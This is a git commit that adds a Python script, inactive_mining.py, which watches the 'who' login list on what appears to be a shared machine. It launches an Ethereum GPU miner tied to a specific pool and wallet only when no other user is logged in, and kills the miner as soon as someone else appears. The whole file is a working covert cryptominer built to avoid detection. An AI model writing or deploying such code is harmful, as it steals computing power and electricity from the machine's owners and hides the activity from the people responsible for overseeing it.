c0f4fcaef8d3ccf41892649db60e22ad74dc449b
toosyou <toosyou.tw@gmail.com>
2017-09-30 15:27:36 +0800

    functinal

---
+++ inactive_mining.py
@@ -0,0 +1,36 @@
+import os
+import signal
+import time
+import threading
+import schedule
+import subprocess
+
+mining_is_on = False
+miner_process = None
+
+def mining_without_notice():
+    global mining_is_on
+    global miner_process
+
+    threading.Timer(5, mining_without_notice).start()
+    someone_else_detected = False
+    who_read = os.popen('who').read()
+    who_read = who_read.splitlines()
+    for line in who_read:
+        if not line.startswith('toosyou') and (not 'tmux' in line):
+            print('Someone else logins!')
+            someone_else_detected = True
+            if mining_is_on:
+                # kill the miner
+                miner_process.kill()
+                mining_is_on = False
+
+    # open miner
+    if someone_else_detected == False and mining_is_on == False:
+        print('Open miner!')
+        miner_process = subprocess.Popen(['/usr/bin/ethminer', '-G', '-F', 'http://ethereumpool.co/?miner=64@0x77209304F249d46DFA6Af187451A32bFeFd219e1@mip1080'], env=os.environ)
+        print('pid =', miner_process.pid)
+        mining_is_on = True
+
+if __name__ == '__main__':
+    mining_without_notice()
